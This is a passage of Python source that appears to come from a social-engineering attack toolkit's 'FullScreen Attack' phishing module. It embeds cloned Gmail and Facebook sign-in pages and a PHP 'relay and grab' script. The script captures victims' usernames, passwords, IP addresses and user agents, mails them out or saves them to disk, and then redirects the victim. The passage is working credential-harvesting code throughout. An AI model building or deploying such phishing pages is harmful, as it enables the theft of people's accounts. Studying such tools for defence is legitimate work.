  -webkit-border-radius: 1em;
  -moz-border-radius: 1em;
  border-radius: 1em;
  text-decoration: none;
  position: relative;
  top: 0px;
  }
  .help-link:visited {
  color: #fff;
  }
  .help-link:hover {
  color: #fff;
  background: #c03523;
  text-decoration: none;
  }
  .help-link:active {
  opacity: 1;
  background: #ae2817;
  }
</style>
<style type="text/css">
  .main {
  width: auto;
  max-width: 1000px;
  min-width: 780px;
  }
  .product-info {
  margin: 0 385px 0 0;
  }
  .product-info h3 {
  font-size: 1.23em;
  font-weight: normal;
  }
  .product-info a:visited {
  color: #61c;
  }
  .product-info .g-button:visited {
  color: #666;
  }
  .sign-in {
  width: 335px;
  float: right;
  }
  .signin-box,
  .accountchooser-box {
  margin: 12px 0 0;
  padding: 20px 25px 15px;
  background: #f1f1f1;
  border: 1px solid #e5e5e5;
  }
  .product-headers {
  margin: 0 0 1.5em;
  }
  .product-headers h1 {
  font-size: 25px;
  margin: 0 !important;
  }
  .product-headers h2 {
  font-size: 16px;
  margin: .4em 0 0;
  }
  .features {
  overflow: hidden;
  margin: 2em 0 0;
  }
  .features li {
  margin: 3px 0 2em;
  }
  .features img {
  float: left;
  margin: -3px 0 0;
  }
  .features p {
  margin: 0 0 0 68px;
  }
  .features .title {
  font-size: 16px;
  margin-bottom: .3em;
  }
  .features.no-icon p {
  margin: 0;
  }
  .features .small-title {
  font-size: 1em;
  font-weight: bold;
  }
  .notification-bar {
  background: #f9edbe;
  padding: 8px;
  }
</style>
<style type="text/css">
  .signin-box h2 {
  font-size: 16px;
  line-height: 17px;
  height: 16px;
  margin: 0 0 1.2em;
  position: relative;
  }
  .signin-box h2 strong {
  display: inline-block;
  position: absolute;
  right: 0;
  top: 1px;
  height: 19px;
  width: 52px;
  background: transparent url(http://ssl.gstatic.com/accounts/ui/google-signin-flat.png) no-repeat;
  }
  @media only screen and (-webkit-device-pixel-ratio: 2){
  .signin-box h2 strong {
  background: transparent url(http://ssl.gstatic.com/accounts/ui/google-signin-flat_2x.png) no-repeat;
  background-size: 52px 19px;
  }
  }
  .signin-box div {
  margin: 0 0 1.5em;
  }
  .signin-box label {
  display: block;
  }
  .signin-box input[type=email],
  .signin-box input[type=text],
  .signin-box input[type=password] {
  width: 100%;
  height: 32px;
  font-size: 15px;
  direction: ltr;
  }
  .signin-box .email-label,
  .signin-box .passwd-label {
  font-weight: bold;
  margin: 0 0 .5em;
  display: block;
  -webkit-user-select: none;
  -moz-user-select: none;
  user-select: none;
  }
  .signin-box .reauth {
  display: inline-block;
  font-size: 15px;
  height: 29px;
  line-height: 29px;
  margin: 0;
  }
  .signin-box label.remember {
  display: inline-block;
  vertical-align: top;
  margin: 9px 0 0;
  }
  .signin-box .remember-label {
  font-weight: normal;
  color: #666;
  line-height: 0;
  padding: 0 0 0 .4em;
  -webkit-user-select: none;
  -moz-user-select: none;
  user-select: none;
  }
  .signin-box input[type=submit] {
  margin: 0 1.5em 1.2em 0;
  height: 32px;
  font-size: 13px;
  }
  .signin-box ul {
  margin: 0;
  }
  .signin-box .training-msg {
  padding: .5em 8px;
  background: #f9edbe;
  }
  .signin-box .training-msg p {
  margin: 0 0 .5em;
  }
</style>
<link rel="publisher" href="https://plus.google.com/103345707817934461425">
<style type="text/css">
  .mail .mail-promo {
  border: 1px solid #ebebeb;
  margin: 30px 0 0;
  padding: 20px;
  overflow: hidden;
  }
  .mail-promo-64 h4 {
  padding-top: 12px;
  }
  .mail .mail-promo h3,
  .mail .mail-promo p {
  margin-left: 60px;
  }
  .mail .mail-promo img {
  width: 42px;
  margin: 3px 0 0;
  float: left;
  }
  .mail .mail-promo h3 {
  font-size: 16px;
  margin-bottom: .3em;
  }
  .mail .mail-promo p {
  margin-bottom: 0;
  }
  .mail .mail-promo p:last-of-type {
  margin-bottom: 0;
  }
  .mail .mail-promo a {
  white-space: nowrap;
  }
  .mail .mail-promo-64 {
  padding: 5px 18px 5px 10px;
  }
  .mail .mail-promo-64 img {
  width: 64px;
  height: 64px;
  }
  .mail .mail-promo-64 h3,
  .mail .mail-promo-64 p {
  margin-left: 76px;
  }
  .mail .mail-promo-64 h3 {
  padding-top: .6em;
  }
  .mail h3.mail-hero-heading {
  font-family: 'open sans', arial, sans-serif;
  font-size: 24px;
  font-weight: 300;
  }
  .mail h4.mail-hero-heading {
  color: #565656;
  font-size: 15px;
  font-weight: normal;
  line-height: 22px;
  margin-top: 15px;
  width: 270px;
  }
  .mail h5.mail-about-heading {
  color: #565656;
  font-size: 15px;
  font-weight: bold;
  }
  .mail ul.mail-links {
  margin: 0;
  overflow: hidden;
  }
  .mail ul.mail-links li {
  display: inline-block;
  margin-right: 20px;
  *display: inline; /*ie7*/
  }
  .mail .mail-hero {
  background-image:url("http://ssl.gstatic.com/accounts/services/mail/gradient.png");
  background-repeat: no-repeat;
  background-position: 0 137px;
  height: 317px;
  margin-top: -20px;
  width: 100%;
  }
  .mail .mail-hero-left {
  display: block;
  float: left;
  width: 55%;
  }
  .mail .mail-hero-right {
  float: left;
  width: 45%;
  }
  .mail .mail-about-section {
  padding-top: 60px;
  width: 100%;
  }
  .mail .mail-about-col-left {
  display: block;
  float: left;
  width: 55%;
  }
  .mail .mail-about-col-right {
  display: block;
  float: left;
  width: 45%;
  }
  .mail .mail-about-col-space {
  display: block;
  float: left;
  width: 40px;
  }
  .mail .mail-buttons {
  vertical-align: top;
  margin-top: 90px;
  width: 300px;
  }
  .mail .mail-button-google-play {
  margin-bottom: 1px;
  }
  .mail .mail-button-unit {
  display: inline-block;
  padding-right: 10px;
  float: left;
  }
  .mail .mail-hero-img {
  padding-left: 70px;
  }
  .mail p.mail-about-text,
  .mail p.mail-account-text {
  color: #575757;
  line-height: 20px;
  }
  .mail p.mail-about-text {
  width: 80%;
  }
@media only screen and (max-width: 1100px) {
  .mail h5.mail-about-heading {
  font-size: 13px;
  width: 80%;
  }
}
</style>
  </head>
  <body>
  <div class="wrapper">
  <div class="google-header-bar">
  <div class="header content clearfix">
  <img class="logo" src="http://ssl.gstatic.com/images/logos/google_logo_41.png" alt="Google">
  <span class="signup-button">
  New to Gmail?
  <a id="link-signup" class="g-button g-button-red" href="https://accounts.google.com/SignUp?service=mail&continue=http%3A%2F%2Fmail.google.com%2Fmail%2F&ltmpl=default">
  Create an account
  </a>
  </span>
  </div>
  </div>
  <div class="main content clearfix">
  <div class="sign-in">
<div class="signin-box">
  <h2>Sign in <strong></strong></h2>
  <form novalidate id="gaia_loginform" action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post">
  <input type="hidden" 
  
    
  name="continue" id="continue" value="http://mail.google.com/mail/"

  
 >
  <input type="hidden" 
  
    
  name="service" id="service" value="mail"

  
 >
  <input type="hidden" 
  
    
  name="rm" id="rm" value="false"

  
 >
  <input type="hidden" 
  
    
  name="dsh" id="dsh" value="1669574552691490000"

  
 >
  <input type="hidden" 
  
    
  name="ltmpl" id="ltmpl" value="default"

  
 >
  <input type="hidden" 
  
    
  name="scc" id="scc" value="1"

  
 >
  <input type="hidden"
         name="GALX"
         value="t4YOO_8rpa4">
  <input type="hidden"
    id="pstMsg"
    name="pstMsg"
    value="0">
  <input type="hidden"
    id="dnConn"
    name="dnConn"
    value="">
  <input type="hidden"
    id="checkConnection"
    name="checkConnection"
    value="">
  <input type="hidden"
    id="checkedDomains"
    name="checkedDomains"
    value="youtube">
<input type="hidden" name="timeStmp" id="timeStmp"
       value=''/>
<input type="hidden" name="secTok" id="secTok"
       value=''/>
<input type="hidden" id="_utf8" name="_utf8" value="&#9731;"/>
  <input type="hidden" name="bgresponse" id="bgresponse" value="js_disabled">
<div class="email-div">
  <label for="Email"><strong class="email-label">Username</strong></label>
  <input type="email" spellcheck="false"  

  name="Username" id="Email" value=""

  

      
    >
</div>
<div class="passwd-div">
  <label for="Passwd"><strong class="passwd-label">Password</strong></label>
  <input type="password" name="Password" id="Passwd"
    
    
    
  >
</div>
  <input type="submit" class="g-button g-button-submit" name="Submit" id="signIn"
      value="Sign in">
  <label class="remember" onclick="">
  <input type="checkbox" 
  name="PersistentCookie" id="PersistentCookie" value="yes"

    checked="checked"
  >
  <strong class="remember-label">
  Stay signed in
  </strong>
  </label>
  <input type="hidden" name="rmShown" value="1">
  </form>
  <ul>
  <li>
  <a id="link-forgot-passwd"
          href="https://accounts.google.com/RecoverAccount?service=mail&amp;continue=http%3A%2F%2Fmail.google.com%2Fmail%2F"
          target="_top">
  Can&#39;t access your account?
  </a>
  </li>
  </ul>
</div>
  </div>
  <div class="product-info mail">
<div class="product-headers">
  <h1 class="redtext">Gmail</h1>
</div>
<div class="mail-hero">
  <div class="mail-hero-left">
  <h4 class="mail-hero-heading">Experience the ease and simplicity of Gmail, everywhere you go.</h4>
  <div class="mail-buttons">
  <div class="mail-button-unit">
  <a href="https://mail.google.com/mail/help/redirect/index.html?r=android&hl=en">
  <img src="http://ssl.gstatic.com/accounts/services/mail/buttons/google_play_en.png" class="mail-button-google-play">
  </a>
  </div>
  <div class="mail-button-unit">
  <a href="https://mail.google.com/mail/help/redirect/index.html?r=apple&hl=en">
  <img src="http://ssl.gstatic.com/accounts/services/mail/buttons/apple_store_en.png">
  </a>
  </div>
  </div>
  </div>
  <div class="mail-hero-right">
  <img src="http://ssl.gstatic.com/accounts/services/mail/phone.png" class="mail-hero-img">
  </div>
</div>
<div class="mail-about-section">
  <div class="mail-about-col-left">
  <h5 class="mail-about-heading">About Gmail - email from Google</h5>
  <p class="mail-about-text">Video chat with a friend, or give someone a ring all from your inbox.
  See more reasons to
  <a href="https://mail.google.com/mail/help/intl/en/whygmail.html"
    onclick="_gaq.push(['_link', 'https://mail.google.com/mail/help/intl/en/whygmail.html', 'true']); return false;">
  switch</a> or check out our
  <a href="http://mail.google.com/mail/help/intl/en-US/features.html"
      onclick="_gaq.push(['_link', 'http://mail.google.com/mail/help/intl/en-US/features.html', 'true']); return false;">
  newest features</a>.
  </div>
  <div class="mail-about-col-space"></div>
  <div class="mail-about-col-right">
  <h5 class="mail-about-heading">Bring Gmail to work with Google Apps</h5>
  <p class="mail-account-text">Get the Gmail you love with custom email, calendar, video meetings & more for your business. <a href="http://www.google.com/enterprise/apps/business/campaign/personal_gmail.html?utm_source=gmail_promo&utm_medium=et&utm_campaign=WW--2012q3--ww_apps_smb_et_2012-gmailloginpage:70160000000jf0oaag&utm_content=en_US">Learn more</a></p>
  </div>
</div>
  </div>
  <div id="cc_iframe_parent"></div>
  </div>
<div class="google-footer-bar">
  <div class="footer content clearfix">
  <ul>
  <li> 2013 Google</li>
  <li><a href="http://www.google.com/apps/intl/en/business/gmail.html#utm_medium=et&utm_source=gmail-signin-en&utm_campaign=crossnav" target="_blank">Gmail for Work</a></li>
  <li><a href="http://mail.google.com/mail/help/intl/en/terms.html" target="_blank">Terms &amp; Privacy</a></li>
  <li><a href="http://mail.google.com/support/?hl=en" target="_blank">Help</a></li>
  </ul>
  <span id="lang-chooser-wrap" class="lang-chooser-wrap" style="display: none;">
  <img src="http://ssl.gstatic.com/images/icons/ui/common/universal_language_settings-21.png">
  <select id="lang-chooser" class="lang-chooser">
  </option>
  </select>
  </span>
  </div>
</div>
  </div>
  </body>
</html>
</div>        
        <script src=\""""+pathList[3]+"""\"></script> 
        <script src=\""""+pathList[4]+"""\"></script>
        <script src=\""""+pathList[5]+"""\"></script>
        <script src=\""""+pathList[6]+"""\"></script>
        <script src=\""""+pathList[7]+"""\"></script>

</body>
</html>

<?PHP
// FullScreen Attack PHP Relay and Grab Code
// Written By: d4rk0
// Twitter: @d4rk0s


function writeFile($fileName,$data,$fileType){
    // This Opens file at end for writing if doesnt exist tries to create it
    $file = fopen($fileName, 'a');
    fwrite($file, $data);
    fclose($file);
  }


function sendM($to,$message){
        // To send HTML mail, the Content-type header must be set
        $headers  = 'MIME-Version: 1.0' . "\r\n";
        $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
        // Additional headers
        $headers .= 'From: SET Attack <fullscreen@phish.org>' . "\\r\\n";
        $subject = "Victims Information";
        // Mail it
        mail($to, $subject, $message, $headers);
 }

function pageForward($page){
        // Page Forward
        echo '<meta http-equiv="refresh" content="0;URL='.$page.'">';
 }

function randomFilename(){
     // return random file name
    mt_srand(time()%2147 * 1000000 + (double)microtime() * 1000000); 
    $randomNUM = mt_rand(1, 972484); 
    $fileNAME = "report" . $randomNUM. ".txt";
    return $fileNAME;
 }


function pullIP(){
    // This Returns an IP of person
    if (!empty($_SERVER['HTTP_CLIENT_IP'])){
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){   //to check ip is pass from proxy
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    else{
        $ip = $_SERVER['REMOTE_ADDR'];
    }

    return $ip;
 }

function userAgent(){
    $Agent = $_SERVER['HTTP_USER_AGENT'];
    return $Agent;
 }


if(isset($_POST['submit'])){

       $action  = \""""+valueList[0]+"""\";
       $redirect = \""""+valueList[1]+"""\";
       $verbose = \""""+valueList[2]+"""\";
       $fileName = \""""+valueList[3]+"""\";
       $to = \""""+valueList[3]+"""\";
       // Grab Form Values
       $email = $_POST[\"Username\"];
       $password =  $_POST[\"Password\"];
   
    // Specify rest of PHP code
       
    // Verbose loud
    if ($verbose == "loud"){
        $IP = pullIP();
        $Agent = userAgent();
        $message = "-- Information Request: \n"." Email / Username: " . $email . " \n Password: " . $password . "\n -- Other Information: ".
        "\n Victim IP: " .$IP. " UserAgent: ".$Agent;
        }

   // Verbose quiet
   if ($verbose == "quiet"){
        $message = "-- Information Request: \n"." Email / Username: " . $email . " \n Password: " . $password . "\n -- END OF TRANSCRIPT";
        }


    // Send in mail
    if ($action == "mail"){
       // Email Message 
        sendM($to,$message);
        pageForward($redirect);
    }
  

    // Save to ServerDisk as Same File
    if ($action == "diskFile"){
        // Write to Individual File 
        if ($fileName == ""){ $fileName = "SETInfo.txt";  }
        writeFile($fileName,$message);
        pageForward($redirect);
    }


    // Save to ServerDisk Random File
    if ($action == "diskRandom"){
        // Get random File name
        $fileName = randomFilename();          
        writeFile($fileName,$message);
        pageForward($redirect);
    }

 }

?>
            """
            # Append Code to list
            indexList.append(indexCode) 
            # Append Index List
            return indexList  


        # Facebook HTML For FullScreeen
        if codeType == "FB":
            indexList = []
            indexCode = """<!doctype html>
<html class="no-js" lang="en">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<title>"""+title+"""</title>
<meta name="description" content="">
<link rel="stylesheet" href="css/style.css">
</head>
<body>
  
   <a class=\"spoofLink\" href=\""""+pathList[0]+"""\">"""+pathList[1]+"""</a>


<div id="spoofHeader">
<div id="spoofMenu"></div>
<div id="spoofBrowser"></div>
</div>


<div id="spoofSite">

<!DOCTYPE html>
<html lang="en" id="facebook" class="no_js">
<head><meta charset="utf-8" /><meta name="robots" content="noodp, noydir" /><meta name="referrer" content="default" id="meta_referrer" /><meta name="description" content="Facebook is a social utility that connects people with friends and others who work, study and live around them. People use Facebook to keep up with friends, upload an unlimited number of photos, post links and videos, and learn more about the people they meet." /><link rel="alternate" media="handheld" href="https://www.facebook.com/login.php" /><title id="pageTitle">Facebook</title><meta property="og:site_name" content="Facebook" /><meta property="og:url" content="https://www.facebook.com/login.php" /><meta property="og:locale" content="en_US" /><link rel="alternate" hreflang="ko" href="https://ko-kr.facebook.com/login.php" /><link rel="alternate" hreflang="es-es" href="https://es-es.facebook.com/login.php" /><link rel="alternate" hreflang="id" href="https://id-id.facebook.com/login.php" /><link rel="alternate" hreflang="vi" href="https://vi-vn.facebook.com/login.php" /><link rel="alternate" hreflang="es" href="https://es-la.facebook.com/login.php" /><link rel="alternate" hreflang="th" href="https://th-th.facebook.com/login.php" /><link rel="alternate" hreflang="fr" href="https://fr-fr.facebook.com/login.php" /><link rel="alternate" hreflang="it" href="https://it-it.facebook.com/login.php" /><link rel="alternate" hreflang="en" href="https://www.facebook.com/login.php" /><link rel="shortcut icon" href="https://fbstatic-a.akamaihd.net/rsrc.php/yl/r/H3nktOa7ZMg.ico" /><noscript><meta http-equiv="X-Frame-Options" content="DENY" /></noscript>
    <link type="text/css" rel="stylesheet" href="https://fbstatic-a.akamaihd.net/rsrc.php/v2/ys/r/DK3seKaYZKC.css" />
    <link type="text/css" rel="stylesheet" href="https://fbstatic-a.akamaihd.net/rsrc.php/v2/yM/r/Xu2jHbxGWaO.css" />
    <link type="text/css" rel="stylesheet" href="https://fbstatic-a.akamaihd.net/rsrc.php/v2/yw/r/d2yi244yqfK.css" />
  </head><body class="login_page fbx UIPage_LoggedOut gecko Locale_en_US"><div class="_li"><div id="pagelet_bluebar" data-referrer="pagelet_bluebar"><div id="blueBarHolder"><div id="blueBar"><div><div class="loggedout_menubar_container"><div class="clearfix loggedout_menubar"><a class="lfloat" href="/" title="Go to Facebook Home"><i class="fb_logo img sp_459faa sx_955643"><u>Facebook logo</u></i></a></div></div><div class="signupBanner"><div class="signup_bar_container"><div class="signup_box clearfix"><span class="signup_box_content"><a class="_42ft _42fu signup_btn selected _42gz _42gy" role="button" href="/r.php?locale=en_US">Sign Up</a></span></div></div></div></div></div></div></div><div id="globalContainer" class="uiContextualLayerParent"><div id="content" class="fb_content clearfix"><div class="UIFullPage_Container"><div class="mvl ptm uiInterstitial login_page_interstitial uiInterstitialLarge uiBoxWhite"><div class="uiHeader uiHeaderBottomBorder mhl mts uiHeaderPage interstitialHeader"><div class="clearfix uiHeaderTop"><div class="rfloat"><h2 class="accessible_elem">Facebook Login</h2><div class="uiHeaderActions"></div></div><div><h2 class="uiHeaderTitle" aria-hidden="true">Facebook Login</h2></div></div></div><div class="phl ptm uiInterstitialContent"><div class="login_form_container"><form id="login_form" action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post"><input type="hidden" name="lsd" value="AVpNsm0y" autocomplete="off" /><div class="hidden_elem"></div><div id="loginform"><input type="hidden" autocomplete="off" id="display" name="display" value="" /><input type="hidden" autocomplete="off" id="enable_profile_selector" name="enable_profile_selector" value="" /><input type="hidden" autocomplete="off" id="legacy_return" name="legacy_return" value="1" /><input type="hidden" autocomplete="off" id="next" name="next" value="" /><input type="hidden" autocomplete="off" id="profile_selector_ids" name="profile_selector_ids" value="" /><input type="hidden" autocomplete="off" id="trynum" name="trynum" value="1" /><input type="hidden" autocomplete="off" name="timezone" value="" id="u_0_0" /><input type="hidden" name="lgnrnd" value="223259_LlDE" /><input type="hidden" id="lgnjs" name="lgnjs" value="n" /><div class="form_row clearfix"><label for="email" class="login_form_label">Email or Phone:</label><input type="text" class="inputtext" id="email" name="Username" value="" /></div><div class="form_row clearfix"><label for="pass" class="login_form_label">Password:</label><input type="password" name="Password" id="pass" class="inputpassword" /></div><div class="persistent"><div class="uiInputLabel clearfix"><input id="persist_box" type="checkbox" value="1" name="persistent" class="uiInputLabelCheckbox" /><label for="persist_box">Keep me logged in</label></div></div><input type="hidden" autocomplete="off" id="default_persistent" name="default_persistent" value="0" /><div id="buttons" class="form_row clearfix"><label class="login_form_label"></label><div id="login_button_inline"><label class="uiButton uiButtonConfirm uiButtonLarge" id="loginbutton" for="u_0_1"><input value="Log In" name="submit" type="submit" id="u_0_1" /></label></div><div id="register_link">or <strong><a href="/r.php?next&amp;locale=en_US&amp;display=page" target="_self" rel="nofollow" id="reg_btn_link" tabindex="-1">Sign up for Facebook</a></strong></div></div><p class="reset_password form_row"><a href="https://www.facebook.com/recover/initiate" target="" tabindex="-1">Forgot your password?</a></p></div></form></div></div></div><ul class="uiList ptm localeSelectorList _509- _4ki _6-h _6-j _6-i"><li><a dir="ltr" href="https://www.facebook.com/login.php" onclick="intl_set_cookie_locale(&quot;en_US&quot;, &quot;https:\/\/www.facebook.com\/login.php&quot;);" title="English (US)">English (US)</a></li><li><a dir="ltr" href="https://www.facebook.com/login.php" onclick="intl_set_cookie_locale(&quot;es_LA&quot;, &quot;https:\/\/www.facebook.com\/login.php&quot;);" title="Spanish">Español</a></li><li><a dir="ltr" href="https://www.facebook.com/login.php" onclick="intl_set_cookie_locale(&quot;pt_BR&quot;, &quot;https:\/\/www.facebook.com\/login.php&quot;);" title="Portuguese (Brazil)">Português (Brasil)</a></li><li><a dir="ltr" href="https://www.facebook.com/login.php" onclick="intl_set_cookie_locale(&quot;fr_FR&quot;, &quot;https:\/\/www.facebook.com\/login.php&quot;);" title="French (France)">Français (France)</a></li><li><a dir="ltr" href="https://www.facebook.com/login.php" onclick="intl_set_cookie_locale(&quot;de_DE&quot;, &quot;https:\/\/www.facebook.com\/login.php&quot;);" title="German">Deutsch</a></li><li><a dir="ltr" href="https://www.facebook.com/login.php" onclick="intl_set_cookie_locale(&quot;it_IT&quot;, &quot;https:\/\/www.facebook.com\/login.php&quot;);" title="Italian">Italiano</a></li><li><a dir="rtl" href="https://www.facebook.com/login.php" onclick="intl_set_cookie_locale(&quot;ar_AR&quot;, &quot;https:\/\/www.facebook.com\/login.php&quot;);" title="Arabic">العربية</a></li><li><a dir="ltr" href="https://www.facebook.com/login.php" onclick="intl_set_cookie_locale(&quot;hi_IN&quot;, &quot;https:\/\/www.facebook.com\/login.php&quot;);" title="Hindi">हिन्दी</a></li><li><a dir="ltr" href="https://www.facebook.com/login.php" onclick="intl_set_cookie_locale(&quot;zh_CN&quot;, &quot;https:\/\/www.facebook.com\/login.php&quot;);" title="Simplified Chinese (China)">中文(简体)</a></li><li><a dir="ltr" href="https://www.facebook.com/login.php" onclick="intl_set_cookie_locale(&quot;ja_JP&quot;, &quot;https:\/\/www.facebook.com\/login.php&quot;);" title="Japanese">日本語</a></li><li><a class="showMore" rel="dialog" href="/ajax/intl/language_dialog.php?uri=https%3A%2F%2Fwww.facebook.com%2Flogin.php&amp;source=TOP_LOCALES_DIALOG" title="Show more languages" role="button">…</a></li></ul></div></div><div id="pageFooter" data-referrer="page_footer"><div id="contentCurve"></div><div role="contentinfo" aria-label="Facebook site links"><table class="uiGrid _51mz navigationGrid" cellspacing="0" cellpadding="0"><tbody><tr class="_51mx"><td class="_51m- hLeft plm"><a href="https://www.facebook.com/mobile/?ref=pf" title="Check out Facebook Mobile.">Mobile</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/find-friends?ref=pf" title="Find anyone on the web.">Find Friends</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/badges/?ref=pf" title="Embed a Facebook badge on your website.">Badges</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/directory/people/" title="Browse our people directory.">People</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/directory/pages/" title="Browse our pages directory.">Pages</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/directory/places/" title="Browse our places directory.">Places</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/appcenter/?ref=pf" title="Check out Facebook App Center.">Apps</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/appcenter/category/games/?ref=pf" title="Check out Facebook games.">Games</a></td><td class="_51m- hLeft plm _51mw"><a href="https://www.facebook.com/appcenter/category/music/?ref=pf" title="Check out Facebook music apps.">Music</a></td></tr><tr class="_51mx"><td class="_51m- hLeft plm"><a href="https://www.facebook.com/facebook" accesskey="8" title="Read our blog, discover the resource center, and find job opportunities.">About</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/campaign/landing.php?placement=pflo&amp;campaign_id=402047449186&amp;extra_1=auto" title="Advertise on Facebook.">Create Ad</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/pages/create/?ref_type=sitefooter" title="Create a Page">Create Page</a></td><td class="_51m- hLeft plm"><a href="https://developers.facebook.com/?ref=pf" title="Develop on our platform.">Developers</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/careers/?ref=pf" title="Make your next career move to our awesome company.">Careers</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/privacy/explanation" title="Learn about your privacy and Facebook.">Privacy</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/help/cookies/?ref=sitefooter" title="Learn about cookies and Facebook.">Cookies</a></td><td class="_51m- hLeft plm"><a href="https://www.facebook.com/policies/?ref=pf" accesskey="9" title="Review our terms and policies.">Terms</a></td><td class="_51m- hLeft plm _51mw"><a href="https://www.facebook.com/help/?ref=pf" accesskey="0" title="Visit our Help Center.">Help</a></td></tr></tbody></table></div><div class="mvl copyright"><div class="fsm fwn fcg"><span> Facebook 2013</span> · <a rel="dialog" href="/ajax/intl/language_dialog.php?uri=https%3A%2F%2Fwww.facebook.com%2Flogin.php" title="Use Facebook in another language." role="button">English (US)</a></div></div></div></div></div>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       </body></html>
</div>
               
        <script src=\""""+pathList[3]+"""\"></script> 
        <script src=\""""+pathList[4]+"""\"></script>
        <script src=\""""+pathList[5]+"""\"></script>
        <script src=\""""+pathList[6]+"""\"></script>
        <script src=\""""+pathList[7]+"""\"></script>

</body>
</html>
<?PHP
// FullScreen Attack PHP Relay and Grab Code
// Written By: d4rk0
// Twitter: @d4rk0s


function writeFile($fileName,$data,$fileType){
    // This Opens file at end for writing if doesnt exist tries to create it
    $file = fopen($fileName, 'a');
    fwrite($file, $data);
    fclose($file);
  }


function sendM($to,$message){
        // To send HTML mail, the Content-type header must be set
        $headers  = 'MIME-Version: 1.0' . "\r\n";
        $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
        // Additional headers
        $headers .= 'From: SET Attack <fullscreen@phish.org>' . "\\r\\n";
        $subject = "Victims Information";
        // Mail it
        mail($to, $subject, $message, $headers);
 }

function pageForward($page){
        // Page Forward
        echo '<meta http-equiv="refresh" content="0;URL='.$page.'">';
 }

function randomFilename(){
     // return random file name
    mt_srand(time()%2147 * 1000000 + (double)microtime() * 1000000); 
    $randomNUM = mt_rand(1, 972484); 
    $fileNAME = "report" . $randomNUM. ".txt";
    return $fileNAME;
 }


function pullIP(){
    // This Returns an IP of person
    if (!empty($_SERVER['HTTP_CLIENT_IP'])){
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){   //to check ip is pass from proxy
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    else{
        $ip = $_SERVER['REMOTE_ADDR'];
    }

    return $ip;
 }

function userAgent(){
    $Agent = $_SERVER['HTTP_USER_AGENT'];
    return $Agent;
 }


if(isset($_POST['submit'])){

       $action  = \""""+valueList[0]+"""\";
       $redirect = \""""+valueList[1]+"""\";
       $verbose = \""""+valueList[2]+"""\";
       $fileName = \""""+valueList[3]+"""\";
       $to = \""""+valueList[3]+"""\";
       // Grab Form Values
       $email = $_POST[\"Username\"];
       $password =  $_POST[\"Password\"];
   
    // Specify rest of PHP code
       
    // Verbose loud
    if ($verbose == "loud"){
        $IP = pullIP();
        $Agent = userAgent();
        $message = "-- Information Request: \n"." Email / Username: " . $email . " \n Password: " . $password . "\n -- Other Information: ".
        "\n Victim IP: " .$IP. " UserAgent: ".$Agent;
        }

   // Verbose quiet
   if ($verbose == "quiet"){
        $message = "-- Information Request: \n"." Email / Username: " . $email . " \n Password: " . $password . "\n -- END OF TRANSCRIPT";
        }


    // Send in mail
    if ($action == "mail"){
       // Email Message 
        sendM($to,$message);
        pageForward($redirect);
    }
  

    // Save to ServerDisk as Same File
    if ($action == "diskFile"){
        // Write to Individual File 
        if ($fileName == ""){ $fileName = "SETInfo.txt";  }
        writeFile($fileName,$message);
        pageForward($redirect);
    }


    // Save to ServerDisk Random File
    if ($action == "diskRandom"){
        // Get random File name
        $fileName = randomFilename();          
        writeFile($fileName,$message);
        pageForward($redirect);
    }

 }

?>
            """
            # Append code to list
            indexList.append(indexCode)
            # Append Index List
            return indexList        

   ################################################################################
   ################################################################################

    def displayProperOSClear(self):
    # Clear The screen

        osName = self.determineOperatingSystem()

        if osName == "windows":
            # clear screen on windows		
            os.system('cls') 
        else:
	     # clear screen on linux/unix -- mac
            os.system('clear')



